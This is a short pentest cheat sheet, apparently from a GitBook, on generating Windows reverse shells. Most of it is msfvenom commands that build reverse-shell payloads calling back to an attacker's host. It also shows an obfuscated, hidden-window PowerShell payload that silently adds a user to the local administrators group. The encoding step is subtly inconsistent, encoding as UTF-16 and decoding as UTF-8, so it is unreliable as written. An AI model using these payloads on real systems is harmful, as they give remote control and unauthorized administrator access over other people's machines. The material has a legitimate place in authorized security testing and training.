# Various Reverse Shells

#### Classic Reverse Shell - Windows (netcat)

Non-staged payloads can be "catched" using netcat.

{% tabs %}
{% tab title="PowerShell" %}
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<Port> -f psh -o shell.ps1`
{% endtab %}

{% tab title="CMD" %}
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<Port> -f exe -o shell.exe`
{% endtab %}
{% endtabs %}

```
  # Create a PowerShell command that adds the user
  # First, base64 encode your command
  powershell -Command "Write-Host ([Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('net localgroup administrators themis /add')))"

  # Output: NABlAHQAIABsAG8AYwBhAGwAZwByAG8AdQBwACAAYQBkAG0AaQBuAGkAcwB0...

  # Create payload with encoded command
  msfvenom -p windows/exec CMD='powershell -nop -w hidden -c "IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\"NABlAHQAIABsAG8AYwBhAGwAZwByAG8AdQBwACAAYQBkA
  G0AaQBuAGkAcwB0AHIAYQB0AG8AcgBzACAAdABoAGUAbQBpAHMAIAAvAGEAZABkACIA\")))"' -f exe -o adduser.exe
```
